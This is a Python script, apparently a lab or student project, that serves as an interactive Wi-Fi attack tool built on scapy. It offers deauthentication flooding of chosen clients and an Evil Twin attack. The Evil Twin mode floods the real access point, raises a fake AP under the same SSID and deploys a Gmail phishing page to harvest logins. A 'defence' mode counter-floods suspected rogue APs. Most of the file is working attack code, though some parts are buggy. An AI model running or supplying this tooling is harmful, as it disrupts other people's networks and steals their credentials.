from scapy.all import *
import string
import threading
import os, time
import random
import subprocess
from threading import *
import socket
import defence
from PyAccessPoint import pyaccesspoint # might work with just import pyaccesspoint without install full library


network_adapter =raw_input("Please enter your network card name (iwconfig)")
ethernet_name = raw_input("Please enter your ethernet card name (iwconfig)")
network_adapter2 = ''
defend_timeout = 60
flood_timeout = 70
search_timeout = 20
ap_list = []
client_list = []
target_mac = ""
packets = 1000
channel = 0
victim_ssid = ''
threads_number = 1000
stop_hopper = False
ap_to_defend = ''
datab = ''
result = 0
detected = False
allow_broadcast = True
already_attacked = False


def scan(pkt):
    if pkt.haslayer(Dot11):
        if (pkt.type == 0 and pkt.subtype == 8):
            if [pkt.addr2,pkt.info, int(ord(pkt[Dot11Elt:3].info))] not in ap_list:
                ap_list.append([pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))])
                print("AP: %s SSID: %s Channel: %d" % (pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))))


def showAPs():
    sniff(iface=network_adapter, prn=scan,timeout=search_timeout)
    num = len(ap_list)
    for x in range(num):
       print(x, ap_list[x][1],ap_list[x][0])

    rescan = raw_input("----- Do you want to rescan ? y/n -----")
    if(rescan=="y"):
       showAPs()
    result = input("Choose number to attack")
    stop_hopper=True
    setChannel(int(ap_list[result][2]))
    scanClients(ap_list[result][0])


def scanClients(rmac):
    global target_mac
    target_mac = rmac
    sniff(iface=network_adapter,prn=onlyClients, timeout=search_timeout)
    attack()



def onlyClients(pkt):
   global client_list
   if ((pkt.addr2==target_mac or pkt.addr3 == target_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff"):
      if pkt.addr1 not in client_list:
        if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
            client_list.append(pkt.addr1)


def attack():
  if(len(client_list) == 0):
      print("No clients found, searching again...")
      scanClients(target_mac)

  for x in range(len(client_list)):
       print(x, client_list[x])
  rescan = raw_input("----- Do you want to rescan? y/n -----")
  if(rescan =="y"):
       scanClients(target_mac)
  choice = input("----- Choose client to attack -----")

  for y in range(packets):  
       pkt = RadioTap()/Dot11(addr1=client_list[choice], addr2=target_mac, addr3=target_mac)/Dot11Deauth()
       sendp(pkt, iface=network_adapter, count=30, inter = .001)


def goMonitor() :
    os.system('sudo ifconfig %s down' % network_adapter)
    os.system('sudo iwconfig %s mode monitor' % network_adapter)
    os.system('sudo ifconfig %s up' % network_adapter)

def cancelMonitor(iface=network_adapter) :
     bash('ifconfig %s down' % iface)
     bash('iwconfig %s mode master' % iface)
     bash('ifconfig %s up' % iface)
     bash('service network-manager restart')
     print('---> Restarting network adapter... \n')
     time.sleep(3)


def setChannel(channel): 
      os.system('iwconfig %s channel %d' % (network_adapter, channel))

def hopper(iface):
    n = 1
    while not stop_hopper:
        time.sleep(0.50)
        os.system('iwconfig %s channel %d' % (iface, n))
        dig = int(random.random() * 14)
        if dig != 0 and dig != n:
            n = dig


def bash(command, shell=0):
        if(shell == 0):
                command = command.split()
		p = subprocess.Popen(command, stdout=subprocess.PIPE)
	else:
             newshell = "xterm -hold -e "
             newstring = "".join((newshell,command))
             process = subprocess.Popen(
    		newstring, 
   		stdout=subprocess.PIPE,
    		stderr=None,
    		shell=True
		)

def createAP(interface,channel,ssid='Hotspot', ip='192.168.45.1', netmask='255.255.255.0'):
   access_point = pyaccesspoint.AccessPoint(interface, ethernet_name, ip, netmask, ssid, channel)
   access_point.start()
   time.sleep(2)

def increasePower():
    os.system("ifconfig %s down" % network_adapter) 
    os.system("iw reg set US")
    os.system("ifconfig %s up" % network_adapter) 

def start_search_clients():
    sniff(iface=network_adapter2,prn=onlyClients)

def attack_clients(target):
   while allow_broadcast:
    for x in client_list:
       pkt = RadioTap() / Dot11(addr1=x, addr2=target, addr3=target)/Dot11Deauth()
       pk2 = RadioTap() / Dot11(addr1=target, addr2=x, addr3=x)/Dot11Deauth()
       sendp(pkt, iface=network_adapter2, count=100)
       sendp(pkt2, iface=network_adapter2, count=100)

def send_broadcast(target, iface=network_adapter,source='FF:FF:FF:FF:FF:FF'):
    global allow_broadcast
    if network_adapter2 is not None:
     while allow_broadcast:
        broadcast = RadioTap()/Dot11(addr1=target,addr2=source,addr3=target)/Dot11ProbeReq()/Dot11Elt(ID="SSID", info="")
        sendp(broadcast, iface=iface, count=50, inter = .001)
     print("---> Attack ended \n")
       
def startServices():
    bash('/etc/init.d/apache2 start')
    bash('/etc/init.d/mysql start')
     
def startAttackAP(interface,channel,ssid,target):
     setChannel(channel)
     createAP(interface,channel,ssid)
     print("---> %s in channel %d has been activated! \n" %(ssid,channel))
     if not already_attacked:
           thread = threading.Thread(target=send_broadcast, args=(ap_list[result][0], network_adapter2,), name="broadcast_flooding")
           thread.daemon = True
           thread.start()
           print("---> Attack has been started, target is getting attacked!\n") 
     startServices()
     time.sleep(1)
     print('---> Start apach & mysql services \n')  
     installPage()
     time.sleep(1)
     print('---> Gmail phishing page loaded \n')
      

def after_timeout():
  global victim_ssid,target_mac,channel,already_attacked,allow_broadcast,detected
  already_attacked = True
  allow_broadcast = False
  print('---> Finishing sending prob requests to AP...\n')
  time.sleep(2)
  cancelMonitor()
  time.sleep(1)
  print('---> Raising up Fake AP spot\n')
  startAttackAP(network_adapter, channel, victim_ssid,target_mac)
  detected = False

def startET():
    global target_mac,victim_ssid,channel,network_adapter2,flood_timeout
    sniff(iface=network_adapter, prn=scan,timeout=2)
    num = len(ap_list)
    for x in range(num):
       print(x, ap_list[x][1],ap_list[x][0])
    rescan = raw_input("----- Do you want to rescan ? y/n -----")
    if(rescan=="y"):
       startET()
    result = input("---> Choose number to preform Evil Twin attack")
    stop_hopper=True
    network_adapter2 = raw_input("---> To preform this attack synchronously, you have to provide another monitored card, if you dont have type n \n")
    if network_adapter2 == 'n':
        print('---> Attack will start in 3 seconds and will last %d seconds \n' % flood_timeout)
        time.sleep(3)
        thread = threading.Thread(target=send_broadcast, args=(ap_list[result][0],), name="broadcast_flooding")
        thread.daemon = True
        thread.start()
        target_mac = ap_list[result][0]
        victim_ssid = ap_list[result][1]
        channel = ap_list[result][2]
        threading.Timer(flood_timeout, after_timeout).start()
    else:
        startAttackAP(network_adapter, ap_list[result][2], ap_list[result][1],ap_list[result][0])
    
def installPage():
     bash('mv /gmail/index.html /var/www/html')
     bash('mv /gmail/post.php /var/www/html')

def startDefense():
    global datab,ap_to_defend,detected,defend_timeout
    print("---> Defence against Evil Twin is launching...\n")
    time.sleep(2)
    print('---> Connecting to database \n')
    datab = defence.Database()
    detected = False
    goMonitor()
    time.sleep(2)
    ap_to_defend = raw_input("Please insert name of AP to defend")
    del ap_list[:]
    print('---> Starting to search for a thread around! time setup for %d \n' % defend_timeout)
    sniff(iface=network_adapter, prn=defence_scan,timeout=defend_timeout)
    if detected is False:
       print("---> There is no evil twins around\n")

def defence_scan(pkt):
    global ap_to_defned,datab,detected,allow_broadcast,stop_hopper,flood_timeout
    stop_hopper=False
    allow_broadcast = True
    if pkt.haslayer(Dot11):
        if (pkt.type == 0 and pkt.subtype == 8):    
            if (pkt.info == ap_to_defend and detected is False):
               if datab.get_mac(pkt.addr2) is False:
                    detected = True
                    print('Evil twin detected mac address: %s\n' % pkt.addr2)
                    print('Attack towards him activated, starting to flood probe requests for %d minutes!\n' % flood_timeout)
                    stop_hopper=True
                    time.sleep(2)
                    setChannel(int(ord(pkt[Dot11Elt:3].info)))
                    thread = threading.Thread(target=send_broadcast, args=(pkt.addr2,),  name="evil_twin_attacker")
                    thread.daemon = True
                    thread.start()
                    threading.Timer(flood_timeout, after_timeout).start()

if __name__ == "__main__":
    print("Welcome to our tool!\n")
    print("There are two options you can attack with us\n")
    print("1.Deauth attack\n")
    print("2.Evil Twin\n")
    print("3.Evil Twin Active Defence\n")
    choice = raw_input("Choose your choice")
    thread = threading.Thread(target=hopper, args=(network_adapter, ), name="hopper")
    #thread.daemon = True
    thread.start()
    if(choice == '1'):
        goMonitor()
        print("Searching for APs...")
        showAPs()
    elif(choice == '2'):
        goMonitor()
        time.sleep(1)
        startET()
    elif (choice =='3'):
        goMonitor()
        print("---> Welcome to Evil Twin Active Defense tool!\n")
        print("---> The registered APs located in Register_APs table\n")
        startDefense()
     
       
    

    

